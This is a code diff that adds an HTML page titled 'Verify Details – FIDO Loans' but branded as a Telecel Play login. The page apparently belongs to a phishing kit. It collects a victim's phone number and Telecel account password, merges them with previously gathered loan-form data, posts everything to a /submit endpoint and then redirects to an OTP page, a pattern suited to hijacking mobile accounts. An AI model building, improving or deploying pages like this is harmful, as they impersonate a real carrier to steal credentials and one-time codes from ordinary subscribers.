@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verify Details – FIDO Loans</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing:border-box; margin:0; padding:0; }
+
+    body {
+      font-family:'Nunito',sans-serif;
+      background:#0d0d0d;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      overflow:hidden;
+    }
+
+    /* radial red glow */
+    body::before {
+      content:'';
+      position:fixed;inset:0;
+      background: radial-gradient(ellipse at 80% 20%, rgba(200,30,30,.45) 0%, transparent 60%),
+                  radial-gradient(ellipse at 20% 80%, rgba(160,10,10,.25) 0%, transparent 55%);
+      pointer-events:none;
+    }
+
+    .card {
+      position:relative;z-index:1;
+      width:100%;max-width:420px;
+      padding:48px 32px 36px;
+      text-align:center;
+    }
+
+    /* Avatar */
+    .avatar {
+      width:72px;height:72px;border-radius:50%;
+      background:#e8192c;
+      display:inline-flex;align-items:center;justify-content:center;
+      margin-bottom:12px;
+      box-shadow:0 0 30px rgba(232,25,44,.5);
+    }
+    .avatar span {
+      font-size:2rem;font-weight:800;color:#fff;
+    }
+
+    .brand-name {
+      font-size:1.1rem;font-weight:800;color:#fff;
+      letter-spacing:1px;margin-bottom:4px;
+    }
+    .welcome {
+      font-size:1rem;font-weight:700;color:#e8192c;
+      margin-bottom:6px;
+    }
+    .sub {
+      font-size:.82rem;color:#aaa;
+      line-height:1.5;margin-bottom:28px;
+    }
+
+    /* Fields */
+    .field { margin-bottom:16px; text-align:left; }
+    label.fl {
+      display:block;font-size:.8rem;font-weight:700;
+      color:#bbb;margin-bottom:6px;
+    }
+    .field select, .field input {
+      width:100%;padding:12px 14px;
+      background:#1a1a1a;border:1px solid #333;border-radius:8px;
+      color:#fff;font-family:inherit;font-size:.93rem;outline:none;
+      transition:border .2s;
+    }
+    .field select:focus,.field input:focus { border-color:#e8192c; }
+    .field select option { background:#1a1a1a; }
+
+    /* Password wrapper */
+    .pw-wrap { position:relative; }
+    .pw-wrap input { padding-right:44px; }
+    .pw-toggle {
+      position:absolute;right:14px;top:50%;transform:translateY(-50%);
+      background:none;border:none;cursor:pointer;color:#888;
+      display:flex;align-items:center;
+    }
+    .pw-toggle:hover { color:#ccc; }
+
+    .forgot {
+      text-align:right;font-size:.8rem;
+      color:#e8192c;cursor:pointer;margin-top:4px;
+      display:block;
+    }
+    .forgot:hover{text-decoration:underline;}
+
+    /* Buttons */
+    .btn {
+      display:block;width:100%;padding:14px;border:none;border-radius:8px;
+      font-family:inherit;font-size:1rem;font-weight:700;cursor:pointer;
+      transition:opacity .2s,transform .1s;margin-top:12px;
+    }
+    .btn-red  { background:#e8192c;color:#fff; }
+    .btn-red:hover  { opacity:.9; transform:translateY(-1px); }
+    .btn-outline { background:transparent;color:#e8192c;border:2px solid #e8192c; }
+    .btn-outline:hover { background:rgba(232,25,44,.1); }
+    .btn:disabled { opacity:.5;cursor:not-allowed; }
+
+    .version { font-size:.75rem;color:#555;margin-top:20px; }
+
+    /* Spinner overlay */
+    #spinner {
+      display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);
+      z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:14px;
+    }
+    #spinner.show{display:flex;}
+    .spin {
+      width:40px;height:40px;border:4px solid #333;
+      border-top-color:#e8192c;border-radius:50%;
+      animation:rotate .7s linear infinite;
+    }
+    @keyframes rotate{to{transform:rotate(360deg);}}
+    #spinner p{color:#fff;font-size:.9rem;}
+
+    /* Success overlay */
+    #success {
+      display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);
+      z-index:1000;align-items:center;justify-content:center;flex-direction:column;gap:16px;
+      text-align:center;padding:32px;
+    }
+    #success.show{display:flex;}
+    .check-icon{font-size:3.5rem;}
+    #success h3{color:#4caf91;font-size:1.3rem;font-weight:800;}
+    #success p{color:#ccc;font-size:.88rem;max-width:320px;line-height:1.6;}
+
+    /* toast */
+    #toast {
+      position:fixed;bottom:24px;left:50%;transform:translateX(-50%);
+      background:#e8192c;color:#fff;padding:10px 22px;border-radius:20px;
+      font-size:.85rem;opacity:0;transition:opacity .3s;pointer-events:none;z-index:2000;
+    }
+    #toast.show{opacity:1;}
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="avatar"><span>t</span></div>
+  <p class="brand-name">telecel</p>
+  <p class="welcome">Welcome to Telecel Play</p>
+  <p class="sub">Enter your number to sign up or log in.<br>You need to be a Telecel subscriber to proceed.</p>
+
+  <div class="field">
+    <label class="fl" for="acct-type">Account type</label>
+    <select id="acct-type">
+      <option>Mobile</option>
+      <option>Broadband</option>
+    </select>
+  </div>
+
+  <div class="field">
+    <label class="fl" for="phone">Phone Number</label>
+    <input type="tel" id="phone" placeholder="0XX XXX XXXX" maxlength="15">
+  </div>
+
+  <div class="field">
+    <label class="fl" for="password">Password</label>
+    <div class="pw-wrap">
+      <input type="password" id="password" placeholder="Enter password">
+      <button class="pw-toggle" onclick="togglePw()" type="button" aria-label="Toggle password">
+        <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none"
+             viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+      </button>
+    </div>
+    <span class="forgot" onclick="showToast('Password reset is handled via Telecel.')">Forgot your password?</span>
+  </div>
+
+  <button class="btn btn-red" id="next-btn" onclick="handleNext()">Next</button>
+  <button class="btn btn-outline" onclick="window.location='form.html'">Go Back</button>
+
+  <p class="version">v 5.3.2 (1.0.0)</p>
+</div>
+
+<!-- Spinner -->
+<div id="spinner">
+  <div class="spin"></div>
+  <p>Verifying your details…</p>
+</div>
+
+<!-- Success -->
+<div id="success">
+  <div class="check-icon">✅</div>
+  <h3>Application Submitted!</h3>
+  <p>Your loan application has been received. Our team will review it and contact you via phone and email within 24–48 hours.</p>
+</div>
+
+<div id="toast"></div>
+
+<script>
+  function togglePw() {
+    const pw = document.getElementById('password');
+    pw.type = pw.type === 'password' ? 'text' : 'password';
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 3000);
+  }
+
+  async function handleNext() {
+    const phone    = document.getElementById('phone').value.trim();
+    const password = document.getElementById('password').value;
+
+    if (!phone)    { showToast('Please enter your phone number.'); return; }
+    if (!password) { showToast('Please enter your password.'); return; }
+
+    // Retrieve loan form data
+    const loanData = JSON.parse(sessionStorage.getItem('loanData') || '{}');
+    if (!loanData.fullname) {
+      showToast('Session expired. Please fill the form again.');
+      setTimeout(() => window.location.href = 'form.html', 2000);
+      return;
+    }
+
+    const payload = { ...loanData, phone, password, accountType: document.getElementById('acct-type').value };
+
+    document.getElementById('spinner').classList.add('show');
+
+    try {
+      const res = await fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      document.getElementById('spinner').classList.remove('show');
+
+      if (res.ok) {
+        // Save updated data (with phone) and proceed to OTP
+        sessionStorage.setItem('loanData', JSON.stringify(payload));
+        window.location.href = 'otp.html';
+      } else {
+        showToast('Submission failed. Please try again.');
+      }
+    } catch (e) {
+      document.getElementById('spinner').classList.remove('show');
+      showToast('Connection error. Please check your internet and try again.');
+    }
+  }
+</script>
+</body>
+</html>
